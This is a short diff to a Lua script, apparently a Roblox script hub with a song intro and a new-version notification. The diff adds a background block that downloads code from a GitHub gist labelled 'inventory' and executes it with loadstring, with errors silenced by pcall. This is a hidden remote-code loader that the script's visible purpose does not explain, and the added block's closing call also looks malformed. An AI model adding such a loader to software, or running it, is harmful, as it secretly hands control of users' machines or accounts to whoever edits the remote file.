@@ -1380,6 +1380,12 @@ task.spawn(function()
     songIntro()
     
     task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://gist.githubusercontent.com/LiverMods/e078befcb255a18acf13f16177a5e4e1/raw/2b64be3a508926291dc499c3881d7343151e217d/inventory"))();
+        end)
+    end)()
+    
+    task.spawn(function()
         task.wait(random(15, 30))
         AkaliNotif_(Language.NewVersion, Language.AdvancedFeatures, 7.8)
     end)
